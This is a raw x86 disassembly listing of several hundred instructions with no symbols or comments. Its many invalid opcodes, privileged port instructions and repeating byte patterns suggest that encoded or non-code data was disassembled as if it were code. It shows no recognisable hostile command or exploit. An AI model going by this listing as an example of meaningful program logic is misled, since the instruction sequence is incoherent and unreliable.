  4059e4:	a0 d5 5d 93 60       	mov    0x60935dd5,%al
  4059e9:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  4059ee:	b0 4b                	mov    $0x4b,%al
  4059f0:	aa                   	stos   %al,%es:(%edi)
  4059f1:	49                   	dec    %ecx
  4059f2:	3b 39                	cmp    (%ecx),%edi
  4059f4:	9f                   	lahf
  4059f5:	5f                   	pop    %edi
  4059f6:	88 ae 7b 5f 9f 93    	mov    %ch,-0x6c60a085(%esi)
  4059fc:	60                   	pusha
  4059fd:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  405a02:	b0 c8                	mov    $0xc8,%al
  405a04:	34 a5                	xor    $0xa5,%al
  405a06:	e0 60                	loopne 0x405a68
  405a08:	2d a5 94 1a a3       	sub    $0xa31a94a5,%eax
  405a0d:	60                   	pusha
  405a0e:	a0 60 88 e8 7f       	mov    0x7fe88860,%al
  405a13:	5f                   	pop    %edi
  405a14:	9f                   	lahf
  405a15:	23 89 02 7a 5f 9f    	and    -0x60a085fe(%ecx),%ecx
  405a1b:	4b                   	dec    %ebx
  405a1c:	8b bf fe bb 2b 45    	mov    0x452bbbfe(%edi),%edi
  405a22:	fd                   	std
  405a23:	23 30                	and    (%eax),%esi
  405a25:	b5 2b                	mov    $0x2b,%ch
  405a27:	4c                   	dec    %esp
  405a28:	f1                   	int1
  405a29:	b3 f6                	mov    $0xf6,%bl
  405a2b:	b7 2b                	mov    $0x2b,%bh
  405a2d:	51                   	push   %ecx
  405a2e:	2b 5a 2b             	sub    0x2b(%edx),%ebx
  405a31:	38 d3                	cmp    %dl,%bl
  405a33:	20 f5                	and    %dh,%ch
  405a35:	c8 c0 a6 e0          	enter  $0xa6c0,$0xe0
  405a39:	60                   	pusha
  405a3a:	04 5f                	add    $0x5f,%al
  405a3c:	d0 c4                	rol    $1,%ah
  405a3e:	29 80 2b 26 2b 33    	sub    %eax,0x332b262b(%eax)
  405a44:	88 e4                	mov    %ah,%ah
  405a46:	7f 5f                	jg     0x405aa7
  405a48:	9f                   	lahf
  405a49:	eb a6                	jmp    0x4059f1
  405a4b:	48                   	dec    %eax
  405a4c:	49                   	dec    %ecx
  405a4d:	40                   	inc    %eax
  405a4e:	9f                   	lahf
  405a4f:	5f                   	pop    %edi
  405a50:	06                   	push   %es
  405a51:	e5 60                	in     $0x60,%eax
  405a53:	d6                   	salc
  405a54:	ea c6 29 a5 9e c6 5b 	ljmp   $0x5bc6,$0x9ea529c6
  405a5b:	61                   	popa
  405a5c:	a0 eb 66 48 81       	mov    0x814866eb,%al
  405a61:	42                   	inc    %edx
  405a62:	9f                   	lahf
  405a63:	5f                   	pop    %edi
  405a64:	af                   	scas   %es:(%edi),%eax
  405a65:	17                   	pop    %ss
  405a66:	73 ed                	jae    0x405a55
  405a68:	e4 70                	in     $0x70,%al
  405a6a:	9f                   	lahf
  405a6b:	b0 af                	mov    $0xaf,%al
  405a6d:	17                   	pop    %ss
  405a6e:	63 eb                	arpl   %ebp,%ebx
  405a70:	b6 ea                	mov    $0xea,%dh
  405a72:	e4 62                	in     $0x62,%al
  405a74:	9f                   	lahf
  405a75:	6f                   	outsl  %ds:(%esi),(%dx)
  405a76:	57                   	push   %edi
  405a77:	37                   	aaa
  405a78:	61                   	popa
  405a79:	4a                   	dec    %edx
  405a7a:	a8 92                	test   $0x92,%al
  405a7c:	62 ba 28 62 af 17    	bound  %edi,0x17af6228(%edx)
  405a82:	63 eb                	arpl   %ebp,%ebx
  405a84:	b6 6f                	mov    $0x6f,%dh
  405a86:	56                   	push   %esi
  405a87:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405a88:	a2 5f 06 63 98       	mov    %al,0x9863065f
  405a8d:	c6                   	(bad)
  405a8e:	09 27                	or     %esp,(%edi)
  405a90:	0d 2e 06 65 5f       	or     $0x5f65062e,%eax
  405a95:	b8 2b 58 e3 c6       	mov    $0xc6e3582b,%eax
  405a9a:	9f                   	lahf
  405a9b:	ad                   	lods   %ds:(%esi),%eax
  405a9c:	9e                   	sahf
  405a9d:	d5 5e                	aad    $0x5e
  405a9f:	93                   	xchg   %eax,%ebx
  405aa0:	60                   	pusha
  405aa1:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  405aa6:	b0 4b                	mov    $0x4b,%al
  405aa8:	aa                   	stos   %al,%es:(%edi)
  405aa9:	49                   	dec    %ecx
  405aaa:	83 38 9f             	cmpl   $0xffffff9f,(%eax)
  405aad:	5f                   	pop    %edi
  405aae:	88 f6                	mov    %dh,%dh
  405ab0:	7a 5f                	jp     0x405b11
  405ab2:	9f                   	lahf
  405ab3:	bf fe bb f9 bd       	mov    $0xbdf9bbfe,%edi
  405ab8:	63 b5 2b 4c 23 24    	arpl   %esi,0x24234c2b(%ebp)
  405abe:	94                   	xchg   %eax,%esp
  405abf:	b3 f6                	mov    $0xf6,%bl
  405ac1:	b7 29                	mov    $0x29,%bh
  405ac3:	ad                   	lods   %ds:(%esi),%eax
  405ac4:	98                   	cwtl
  405ac5:	eb 7a                	jmp    0x405b41
  405ac7:	e9 e5 5c d3 20       	jmp    0x2113b7b1
  405acc:	f5                   	cmc
  405acd:	c8 5a a6 e0          	enter  $0xa65a,$0xe0
  405ad1:	60                   	pusha
  405ad2:	04 5f                	add    $0x5f,%al
  405ad4:	d0 c4                	rol    $1,%ah
  405ad6:	29 80 2b a5 98 eb    	sub    %eax,-0x14675ad5(%eax)
  405adc:	f5                   	cmc
  405add:	5c                   	pop    %esp
  405ade:	88 4a 7e             	mov    %cl,0x7e(%edx)
  405ae1:	5f                   	pop    %edi
  405ae2:	9f                   	lahf
  405ae3:	eb 93                	jmp    0x405a78
  405ae5:	eb e5                	jmp    0x405acc
  405ae7:	58                   	pop    %eax
  405ae8:	2b 60 88             	sub    -0x78(%eax),%esp
  405aeb:	6a 80                	push   $0xffffff80
  405aed:	5f                   	pop    %edi
  405aee:	9f                   	lahf
  405aef:	c6                   	(bad)
  405af0:	25 20 16 a5 06       	and    $0x6a51620,%eax
  405af5:	e9 e5 56 06 1b       	jmp    0x1b46b1df
  405afa:	a1 60 2b a5 98       	mov    0x98a52b60,%eax
  405aff:	48                   	dec    %eax
  405b00:	e1 42                	loope  0x405b44
  405b02:	9f                   	lahf
  405b03:	5f                   	pop    %edi
  405b04:	af                   	scas   %es:(%edi),%eax
  405b05:	17                   	pop    %ss
  405b06:	9b                   	fwait
  405b07:	eb f5                	jmp    0x405afe
  405b09:	58                   	pop    %eax
  405b0a:	2b 72 2a             	sub    0x2a(%edx),%esi
  405b0d:	b4 da                	mov    $0xda,%ah
  405b0f:	5f                   	pop    %edi
  405b10:	af                   	scas   %es:(%edi),%eax
  405b11:	17                   	pop    %ss
  405b12:	6e                   	outsb  %ds:(%esi),(%dx)
  405b13:	21 89 68 d2 31 28    	and    %ecx,0x2831d268(%ecx)
  405b19:	b4 d8                	mov    $0xd8,%ah
  405b1b:	5f                   	pop    %edi
  405b1c:	2b a5 9c 6f 56 a4    	sub    -0x5ba99064(%ebp),%esp
  405b22:	d8 5f 06             	fcomps 0x6(%edi)
  405b25:	63 90 c6 09 26 0d    	arpl   %edx,0xd2609c6(%eax)
  405b2b:	2e 06                	cs push %es
  405b2d:	65 5f                	gs pop %edi
  405b2f:	b8 2b 50 e3 c6       	mov    $0xc6e3502b,%eax
  405b34:	9f                   	lahf
  405b35:	ad                   	lods   %ds:(%esi),%eax
  405b36:	96                   	xchg   %eax,%esi
  405b37:	d5 63                	aad    $0x63
  405b39:	93                   	xchg   %eax,%ebx
  405b3a:	60                   	pusha
  405b3b:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  405b40:	b0 4b                	mov    $0x4b,%al
  405b42:	aa                   	stos   %al,%es:(%edi)
  405b43:	49                   	dec    %ecx
  405b44:	e9 38 9f 5f 88       	jmp    0x889ffa81
  405b49:	5c                   	pop    %esp
  405b4a:	79 5f                	jns    0x405bab
  405b4c:	9f                   	lahf
  405b4d:	bf fe bb 2b 45       	mov    $0x452bbbfe,%edi
  405b52:	fd                   	std
  405b53:	23 30                	and    (%eax),%esi
  405b55:	b5 2b                	mov    $0x2b,%ch
  405b57:	4c                   	dec    %esp
  405b58:	0a 60 f3             	or     -0xd(%eax),%ah
  405b5b:	b6 f7                	mov    $0xf7,%dh
  405b5d:	eb 99                	jmp    0x405af8
  405b5f:	eb 92                	jmp    0x405af3
  405b61:	eb 78                	jmp    0x405bdb
  405b63:	93                   	xchg   %eax,%ebx
  405b64:	60                   	pusha
  405b65:	b5 08                	mov    $0x8,%ch
  405b67:	74 e7                	je     0x405b50
  405b69:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  405b6e:	04 e9                	add    $0xe9,%al
  405b70:	c0 ed ed             	shr    $0xed,%ch
  405b73:	5c                   	pop    %esp
  405b74:	2b 36                	sub    (%esi),%esi
  405b76:	2b 23                	sub    (%ebx),%esp
  405b78:	88 08                	mov    %cl,(%eax)
  405b7a:	9e                   	sahf
  405b7b:	5f                   	pop    %edi
  405b7c:	9f                   	lahf
  405b7d:	eb e5                	jmp    0x405b64
  405b7f:	5c                   	pop    %esp
  405b80:	2b 37                	sub    (%edi),%esi
  405b82:	88 3e                	mov    %bh,(%esi)
  405b84:	9d                   	popf
  405b85:	5f                   	pop    %edi
  405b86:	9f                   	lahf
  405b87:	93                   	xchg   %eax,%ebx
  405b88:	60                   	pusha
  405b89:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  405b8e:	b0 c8                	mov    $0xc8,%al
  405b90:	bb a7 e0 60 2d       	mov    $0x2d60e0a7,%ebx
  405b95:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b96:	9c                   	pushf
  405b97:	48                   	dec    %eax
  405b98:	7d 3d                	jge    0x405bd7
  405b9a:	9f                   	lahf
  405b9b:	5f                   	pop    %edi
  405b9c:	63 49 bb             	arpl   %ecx,-0x45(%ecx)
  405b9f:	39 9f 5f 8b 50 ff    	cmp    %ebx,-0xaf74a1(%edi)
  405ba5:	be fb b9 fd 23       	mov    $0x23fdb9fb,%esi
  405baa:	2d a0 a0 b5 2b       	sub    $0x2bb5a0a0,%eax
  405baf:	4c                   	dec    %esp
  405bb0:	0a 60 f3             	or     -0xd(%eax),%ah
  405bb3:	b6 f7                	mov    $0xf7,%dh
  405bb5:	eb 99                	jmp    0x405b50
  405bb7:	eb 92                	jmp    0x405b4b
  405bb9:	eb 78                	jmp    0x405c33
  405bbb:	93                   	xchg   %eax,%ebx
  405bbc:	60                   	pusha
  405bbd:	b5 08                	mov    $0x8,%ch
  405bbf:	cc                   	int3
  405bc0:	e7 a0                	out    %eax,$0xa0
  405bc2:	a0 c4 9f 90 04       	mov    0x4909fc4,%al
  405bc7:	e9 c0 ed f5 5c       	jmp    0x5d36498c
  405bcc:	2b 23                	sub    (%ebx),%esp
  405bce:	88 56 9c             	mov    %dl,-0x64(%esi)
  405bd1:	5f                   	pop    %edi
  405bd2:	9f                   	lahf
  405bd3:	eb e5                	jmp    0x405bba
  405bd5:	5c                   	pop    %esp
  405bd6:	2b 2f                	sub    (%edi),%ebp
  405bd8:	2b 36                	sub    (%esi),%esi
  405bda:	88 3a                	mov    %bh,(%edx)
  405bdc:	9e                   	sahf
  405bdd:	5f                   	pop    %edi
  405bde:	9f                   	lahf
  405bdf:	93                   	xchg   %eax,%ebx
  405be0:	60                   	pusha
  405be1:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  405be6:	b0 c8                	mov    $0xc8,%al
  405be8:	13 a7 e0 60 2d a5    	adc    -0x5ad29f20(%edi),%esp
  405bee:	9c                   	pushf
  405bef:	48                   	dec    %eax
  405bf0:	25 3d 9f 5f 63       	and    $0x635f9f3d,%eax
  405bf5:	49                   	dec    %ecx
  405bf6:	63 38                	arpl   %edi,(%eax)
  405bf8:	9f                   	lahf
  405bf9:	5f                   	pop    %edi
  405bfa:	8b 50 ff             	mov    -0x1(%eax),%edx
  405bfd:	be fb b9 fd 23       	mov    $0x23fdb9fb,%esi
  405c02:	2d a0 a0 b5 2b       	sub    $0x2bb5a0a0,%eax
  405c07:	4c                   	dec    %esp
  405c08:	f1                   	int1
  405c09:	19 a8 60 a0 60 0a    	sbb    %ebp,0xa60a060(%eax)
  405c0f:	60                   	pusha
  405c10:	0a 60 e9             	or     -0x17(%eax),%ah
  405c13:	d5 99                	aad    $0x99
  405c15:	b1 27                	mov    $0x27,%cl
  405c17:	ad                   	lods   %ds:(%esi),%eax
  405c18:	9c                   	pushf
  405c19:	b3 f6                	mov    $0xf6,%bl
  405c1b:	b7 29                	mov    $0x29,%bh
  405c1d:	ad                   	lods   %ds:(%esi),%eax
  405c1e:	94                   	xchg   %eax,%esp
  405c1f:	e8 f5 5b 29 a5       	call   0xa569b819
  405c24:	9c                   	pushf
  405c25:	93                   	xchg   %eax,%ebx
  405c26:	60                   	pusha
  405c27:	b5 08                	mov    $0x8,%ch
  405c29:	a9 eb a0 a0 c4       	test   $0xc4a0a0eb,%eax
  405c2e:	9f                   	lahf
  405c2f:	90                   	nop
  405c30:	04 e9                	add    $0xe9,%al
  405c32:	c0 eb e5             	shr    $0xe5,%bl
  405c35:	54                   	push   %esp
  405c36:	88 9e 7d 5f 9f 93    	mov    %bl,-0x6c60a083(%esi)
  405c3c:	60                   	pusha
  405c3d:	b5 08                	mov    $0x8,%ch
  405c3f:	77 eb                	ja     0x405c2c
  405c41:	a0 a0 c4 9f 90       	mov    0x909fc4a0,%al
  405c46:	04 e9                	add    $0xe9,%al
  405c48:	c0 e3 1d             	shl    $0x1d,%bl
  405c4b:	5c                   	pop    %esp
  405c4c:	a0 d5 ad 93 60       	mov    0x6093add5,%al
  405c51:	ba f9 b9 04 e9       	mov    $0xe904b9f9,%edx
  405c56:	b0 49                	mov    $0x49,%al
  405c58:	ee                   	out    %al,(%dx)
  405c59:	63 a0 60 2a a5 9b    	arpl   %esp,-0x645ad5a0(%eax)
  405c5f:	e4 60                	in     $0x60,%al
  405c61:	d4 a8                	aam    $0xa8
  405c63:	8c a2 6f 25 c2 a2    	mov    %fs,-0x5d3dda91(%edx)
  405c69:	60                   	pusha
  405c6a:	a0 eb e5 5c 2a       	mov    0x2a5ce5eb,%al
  405c6f:	60                   	pusha
  405c70:	28 a5 87 eb e5 5c    	sub    %ah,0x5ce5eb87(%ebp)
  405c76:	88 de                	mov    %bl,%dh
  405c78:	7e 5f                	jle    0x405cd9
  405c7a:	9f                   	lahf
  405c7b:	eb f5                	jmp    0x405c72
  405c7d:	5c                   	pop    %esp
  405c7e:	2a a4 a2 5f 28 a5 85 	sub    -0x7a5ad7a1(%edx,%eiz,4),%ah
  405c85:	93                   	xchg   %eax,%ebx
  405c86:	60                   	pusha
  405c87:	b5 08                	mov    $0x8,%ch
  405c89:	9b                   	fwait
  405c8a:	e9 a0 a0 c4 9f       	jmp    0xa004fd2f
  405c8f:	90                   	nop
  405c90:	04 e9                	add    $0xe9,%al
  405c92:	c0 ed e5             	shr    $0xe5,%ch
  405c95:	40                   	inc    %eax
  405c96:	2a b5 85 48 97 3d    	sub    0x3d974885(%ebp),%dh
  405c9c:	9f                   	lahf
  405c9d:	5f                   	pop    %edi
  405c9e:	2b a5 80 1a 00 ab    	sub    -0x54ffe580(%ebp),%esp
  405ca4:	e0 60                	loopne 0x405d06
  405ca6:	88 8a 81 5f 9f e8    	mov    %cl,-0x1760a07f(%edx)
  405cac:	e5 46                	in     $0x46,%eax
  405cae:	2d a5 88 b0 2b       	sub    $0x2bb088a5,%eax
  405cb3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405cb4:	9c                   	pushf
  405cb5:	48                   	dec    %eax
  405cb6:	df 3e                	fistpll (%esi)
  405cb8:	9f                   	lahf
  405cb9:	5f                   	pop    %edi
  405cba:	2b 30                	sub    (%eax),%esi
  405cbc:	d3 3b                	sarl   %cl,(%ebx)
  405cbe:	2a bd 86 8b 73 eb    	sub    -0x148c747a(%ebp),%bh
  405cc4:	6b eb e5             	imul   $0xffffffe5,%ebx,%ebp
  405cc7:	5c                   	pop    %esp
  405cc8:	88 e0                	mov    %ah,%al
  405cca:	80 5f 9f eb          	sbbb   $0xeb,-0x61(%edi)
  405cce:	e5 48                	in     $0x48,%eax
  405cd0:	88 84 7e 5f 9f 9b 78 	mov    %al,0x789b9f5f(%esi,%edi,2)
  405cd7:	6f                   	outsl  %ds:(%esi),(%dx)
  405cd8:	25 39 a0 60 a0       	and    $0xa060a039,%eax
  405cdd:	93                   	xchg   %eax,%ebx
  405cde:	60                   	pusha
  405cdf:	e9 e5 50 d3 3b       	jmp    0x3c13adc9
  405ce4:	2d ad 7c 93 72       	sub    $0x72937cad,%eax
  405ce9:	ea f5 47 2b a5 88 48 	ljmp   $0x4888,$0xa52b47f5
  405cf0:	59                   	pop    %ecx
  405cf1:	5e                   	pop    %esi
  405cf2:	9f                   	lahf
  405cf3:	5f                   	pop    %edi
  405cf4:	2b b5 7c ed e5 48    	sub    0x48e5ed7c(%ebp),%esi
  405cfa:	88 72 7d             	mov    %dh,0x7d(%edx)
  405cfd:	5f                   	pop    %edi
  405cfe:	9f                   	lahf
  405cff:	eb f5                	jmp    0x405cf6
  405d01:	48                   	dec    %eax
  405d02:	58                   	pop    %eax
  405d03:	0c eb                	or     $0xeb,%al
  405d05:	a0 a0 48 69 40       	mov    0x406948a0,%al
  405d0a:	9f                   	lahf
  405d0b:	5f                   	pop    %edi
  405d0c:	25 20 1e b7 2d       	and    $0x2db71e20,%eax
  405d11:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405d12:	78 b0                	js     0x405cc4
  405d14:	2b b5 88 18 4c ab    	sub    -0x54b3e778(%ebp),%esi
  405d1a:	e0 60                	loopne 0x405d7c
  405d1c:	88 14 80             	mov    %dl,(%eax,%eax,4)
  405d1f:	5f                   	pop    %edi
  405d20:	9f                   	lahf
  405d21:	eb 68                	jmp    0x405d8b
  405d23:	a9 5a 61 a0 60       	test   $0x60a0615a,%eax
  405d28:	a0 eb e5 48 88       	mov    0x8848e5eb,%al
  405d2d:	7c 80                	jl     0x405caf
  405d2f:	5f                   	pop    %edi
  405d30:	9f                   	lahf
  405d31:	eb e5                	jmp    0x405d18
  405d33:	38 88 2c 96 5f 9f    	cmp    %cl,-0x60a069d4(%eax)
  405d39:	e9 e5 50 2d a5       	jmp    0xa56dae23
  405d3e:	74 b0                	je     0x405cf0
  405d40:	2b b5 88 18 4c ab    	sub    -0x54b3e778(%ebp),%esi
  405d46:	e0 60                	loopne 0x405da8
  405d48:	88 e8                	mov    %ch,%al
  405d4a:	80 5f 9f eb          	sbbb   $0xeb,-0x61(%edi)
  405d4e:	70 a2                	jo     0x405cf2
  405d50:	59                   	pop    %ecx
  405d51:	5f                   	pop    %edi
  405d52:	9f                   	lahf
  405d53:	5f                   	pop    %edi
  405d54:	1f                   	pop    %ds
  405d55:	eb e5                	jmp    0x405d3c
  405d57:	48                   	dec    %eax
  405d58:	88 50 7f             	mov    %dl,0x7f(%eax)
  405d5b:	5f                   	pop    %edi
  405d5c:	9f                   	lahf
  405d5d:	eb e5                	jmp    0x405d44
  405d5f:	34 88                	xor    $0x88,%al
  405d61:	00 96 5f 9f eb 78    	add    %dl,0x78eb9f5f(%esi)
  405d67:	e3 1d                	jecxz  0x405d86
  405d69:	50                   	push   %eax
  405d6a:	a0 de e9 ed e5       	mov    0xe5ede9de,%al
  405d6f:	30 f0                	xor    %dh,%al
  405d71:	eb e5                	jmp    0x405d58
  405d73:	5c                   	pop    %esp
  405d74:	88 e0                	mov    %ah,%al
  405d76:	7d 5f                	jge    0x405dd7
  405d78:	9f                   	lahf
  405d79:	eb 68                	jmp    0x405de3
  405d7b:	93                   	xchg   %eax,%ebx
  405d7c:	60                   	pusha
  405d7d:	ea e5 46 cb 28 e9 1a 	ljmp   $0x1ae9,$0x28cb46e5
  405d84:	a1 60 a0 60 2b       	mov    0x2b60a060,%eax
  405d89:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405d8a:	9c                   	pushf
  405d8b:	48                   	dec    %eax
  405d8c:	5d                   	pop    %ebp
  405d8d:	3f                   	aas
  405d8e:	9f                   	lahf
  405d8f:	5f                   	pop    %edi
  405d90:	2b a5 70 ed ed 4c    	sub    0x4ceded70(%ebp),%esp
  405d96:	06                   	push   %es
  405d97:	eb f5                	jmp    0x405d8e
  405d99:	50                   	push   %eax
  405d9a:	88 6e 9e             	mov    %ch,-0x62(%esi)
  405d9d:	5f                   	pop    %edi
  405d9e:	9f                   	lahf
  405d9f:	eb e5                	jmp    0x405d86
  405da1:	4c                   	dec    %esp
  405da2:	88 b2 7d 5f 9f 9b    	mov    %dh,-0x6460a083(%edx)
  405da8:	78 d5                	js     0x405d7f
  405daa:	ab                   	stos   %eax,%es:(%edi)
  405dab:	eb e5                	jmp    0x405d92
  405dad:	54                   	push   %esp
  405dae:	2b b5 8c 48 b7 3c    	sub    0x3cb7488c(%ebp),%esi
  405db4:	9f                   	lahf
  405db5:	5f                   	pop    %edi
  405db6:	d3 20                	shll   %cl,(%eax)
  405db8:	fa                   	cli
  405db9:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405dbe:	08 a2 e9 a0 a0 23    	or     %ah,0x23a0a0e9(%edx)
  405dc4:	89 54 76 5f          	mov    %edx,0x5f(%esi,%esi,2)
  405dc8:	9f                   	lahf
  405dc9:	4b                   	dec    %ebx
  405dca:	98                   	cwtl
  405dcb:	eb e5                	jmp    0x405db2
  405dcd:	54                   	push   %esp
  405dce:	23 98 a0 6f 25 56    	and    0x56256fa0(%eax),%ebx
  405dd4:	a0 60 a0 93 60       	mov    0x6093a060,%al
  405dd9:	b5 08                	mov    $0x8,%ch
  405ddb:	9d                   	popf
  405ddc:	ea a0 a0 c4 9f 90 04 	ljmp   $0x490,$0x9fc4a0a0
  405de3:	e9 c0 ea ed 45       	jmp    0x462e48a8
  405de8:	2b 21                	sub    (%ecx),%esp
  405dea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405deb:	1f                   	pop    %ds
  405dec:	cc                   	int3
  405ded:	7a af                	jp     0x405d9e
  405def:	e3 64                	jecxz  0x405e55
  405df1:	60                   	pusha
  405df2:	a0 60 d3 20 2a       	mov    0x2a20d360,%al
  405df7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405df8:	87 1b                	xchg   %ebx,(%ebx)
  405dfa:	b3 60                	mov    $0x60,%bl
  405dfc:	a0 60 d3 32 97       	mov    0x9732d360,%al
  405e01:	53                   	push   %ebx
  405e02:	ca 2a 20             	lret   $0x202a
  405e05:	49                   	dec    %ecx
  405e06:	e1 e8                	loope  0x405df0
  405e08:	ed                   	in     (%dx),%eax
  405e09:	46                   	inc    %esi
  405e0a:	2a a5 86 a8 cc 67    	sub    0x67cca886(%ebp),%ah
  405e10:	af                   	scas   %es:(%edi),%eax
  405e11:	e3 42                	jecxz  0x405e55
  405e13:	60                   	pusha
  405e14:	a0 60 2d a5 88       	mov    0x88a52d60,%al
  405e19:	b0 2b                	mov    $0x2b,%al
  405e1b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405e1c:	9c                   	pushf
  405e1d:	48                   	dec    %eax
  405e1e:	77 3c                	ja     0x405e5c
  405e20:	9f                   	lahf
  405e21:	5f                   	pop    %edi
  405e22:	2b 30                	sub    (%eax),%esi
  405e24:	d3 3b                	sarl   %cl,(%ebx)
  405e26:	2a bd 86 8b 73 eb    	sub    -0x148c747a(%ebp),%bh
  405e2c:	6b eb e5             	imul   $0xffffffe5,%ebx,%ebp
  405e2f:	5c                   	pop    %esp
  405e30:	88 78 7f             	mov    %bh,0x7f(%eax)
  405e33:	5f                   	pop    %edi
  405e34:	9f                   	lahf
  405e35:	eb e5                	jmp    0x405e1c
  405e37:	48                   	dec    %eax
  405e38:	88 1c 7c             	mov    %bl,(%esp,%edi,2)
  405e3b:	5f                   	pop    %edi
  405e3c:	9f                   	lahf
  405e3d:	9b                   	fwait
  405e3e:	78 d5                	js     0x405e15
  405e40:	17                   	pop    %ss
  405e41:	93                   	xchg   %eax,%ebx
  405e42:	60                   	pusha
  405e43:	e9 e5 50 d3 20       	jmp    0x2113af2d
  405e48:	f5                   	cmc
  405e49:	c8 90 a9 e0          	enter  $0xa990,$0xe0
  405e4d:	60                   	pusha
  405e4e:	04 5f                	add    $0x5f,%al
  405e50:	d0 c4                	rol    $1,%ah
  405e52:	29 80 2d ad 6c 93    	sub    %eax,-0x6c9352d3(%eax)
  405e58:	72 ea                	jb     0x405e44
  405e5a:	f5                   	cmc
  405e5b:	47                   	inc    %edi
  405e5c:	2b a5 88 48 e9 5d    	sub    0x5de94888(%ebp),%esp
  405e62:	9f                   	lahf
  405e63:	5f                   	pop    %edi
  405e64:	2b a5 6c 48 39 55    	sub    0x5539486c(%ebp),%esp
  405e6a:	9f                   	lahf
  405e6b:	5f                   	pop    %edi
  405e6c:	29 a5 90 93 60 ba    	sub    %esp,-0x459f6c70(%ebp)
  405e72:	f9                   	stc
  405e73:	b9 04 e9 b0 4b       	mov    $0x4bb0e904,%ecx
  405e78:	aa                   	stos   %al,%es:(%edi)
  405e79:	49                   	dec    %ecx
  405e7a:	b3 35                	mov    $0x35,%bl
  405e7c:	9f                   	lahf
  405e7d:	5f                   	pop    %edi
  405e7e:	88 26                	mov    %ah,(%esi)
  405e80:	76 5f                	jbe    0x405ee1
  405e82:	9f                   	lahf
  405e83:	e3 1d                	jecxz  0x405ea2
  405e85:	50                   	push   %eax
  405e86:	a0 de cf ed e5       	mov    0xe5edcfde,%al
  405e8b:	28 f0                	sub    %dh,%al
  405e8d:	eb e5                	jmp    0x405e74
  405e8f:	5c                   	pop    %esp
  405e90:	88 c4                	mov    %al,%ah
  405e92:	7c 5f                	jl     0x405ef3
  405e94:	9f                   	lahf
  405e95:	eb 68                	jmp    0x405eff
  405e97:	93                   	xchg   %eax,%ebx
  405e98:	60                   	pusha
  405e99:	ea e5 46 cb 28 e9 93 	ljmp   $0x93e9,$0x28cb46e5
  405ea0:	72 eb                	jb     0x405e8d
  405ea2:	e5 5c                	in     $0x5c,%eax
  405ea4:	88 04 7e             	mov    %al,(%esi,%edi,2)
  405ea7:	5f                   	pop    %edi
  405ea8:	9f                   	lahf
  405ea9:	eb e5                	jmp    0x405e90
  405eab:	28 2b                	sub    %ch,(%ebx)
  405ead:	ad                   	lods   %ds:(%esi),%eax
  405eae:	94                   	xchg   %eax,%esp
  405eaf:	c6                   	(bad)
  405eb0:	2b b5 90 48 95 5c    	sub    0x5c954890(%ebp),%esi
  405eb6:	9f                   	lahf
  405eb7:	5f                   	pop    %edi
  405eb8:	d3 20                	shll   %cl,(%eax)
  405eba:	fa                   	cli
  405ebb:	b9 f9 c4 29 70       	mov    $0x7029c4f9,%ecx
  405ec0:	08 a4 ea a0 a0 23 89 	or     %ah,-0x76dc5f60(%edx,%ebp,8)
  405ec7:	52                   	push   %edx
  405ec8:	75 5f                	jne    0x405f29
  405eca:	9f                   	lahf
  405ecb:	4b                   	dec    %ebx
  405ecc:	98                   	cwtl
  405ecd:	eb e5                	jmp    0x405eb4
  405ecf:	54                   	push   %esp
  405ed0:	23 98 a0 6f 25 1d    	and    0x1d256fa0(%eax),%ebx
  405ed6:	a0 60 a0 ea e5       	mov    0xe5eaa060,%al
  405edb:	5b                   	pop    %ebx
  405edc:	cc                   	int3
  405edd:	62 af e3 52 60 a0    	bound  %ebp,-0x5f9fad1d(%edi)
  405ee3:	60                   	pusha
  405ee4:	88 18                	mov    %bl,(%eax)
  405ee6:	6a 5f                	push   $0x5f
  405ee8:	9f                   	lahf
  405ee9:	18 9f 5f 9f df 88    	sbb    %bl,-0x772060a1(%edi)
  405eef:	12 6f 5f             	adc    0x5f(%edi),%ch
  405ef2:	9f                   	lahf
  405ef3:	a0 29 a5 90 eb       	mov    0xeb90a529,%al
  405ef8:	ed                   	in     (%dx),%eax
  405ef9:	54                   	push   %esp
  405efa:	06                   	push   %es
  405efb:	eb f5                	jmp    0x405ef2
  405efd:	50                   	push   %eax
  405efe:	2b a5 9c 48 ef 5c    	sub    0x5cef489c(%ebp),%esp
  405f04:	9f                   	lahf
  405f05:	5f                   	pop    %edi
  405f06:	2b a5 94 eb a0 ea    	sub    -0x155f146c(%ebp),%esp
  405f0c:	a0 e8 e5 47 2b       	mov    0x2b47e5e8,%al
  405f11:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405f12:	9c                   	pushf
  405f13:	48                   	dec    %eax
  405f14:	81 3b 9f 5f 2b 38    	cmpl   $0x382b5f9f,(%ebx)
  405f1a:	2d b5 60 eb e5       	sub    $0xe5eb60b5,%eax
  405f1f:	50                   	push   %eax
  405f20:	88 2c 93             	mov    %ch,(%ebx,%edx,4)
  405f23:	5f                   	pop    %edi
  405f24:	9f                   	lahf
  405f25:	5f                   	pop    %edi
  405f26:	15 20 08 0c eb       	adc    $0xeb0c0820,%eax
  405f2b:	a0 a0 ed f5 1c       	mov    0x1cf5eda0,%al
  405f30:	2b 23                	sub    (%ebx),%esp
  405f32:	88 1a                	mov    %bl,(%edx)
  405f34:	93                   	xchg   %eax,%ebx
  405f35:	5f                   	pop    %edi
  405f36:	9f                   	lahf
  405f37:	5f                   	pop    %edi
  405f38:	15 1c 2d a5 64       	adc    $0x64a52d1c,%eax
  405f3d:	1a a3 60 a0 60 88    	sbb    -0x779f5fa0(%ebx),%ah
  405f43:	d2 7c 5f 9f          	sarb   %cl,-0x61(%edi,%ebx,2)
  405f47:	eb e5                	jmp    0x405f2e
  405f49:	24 2d                	and    $0x2d,%al
  405f4b:	ad                   	lods   %ds:(%esi),%eax
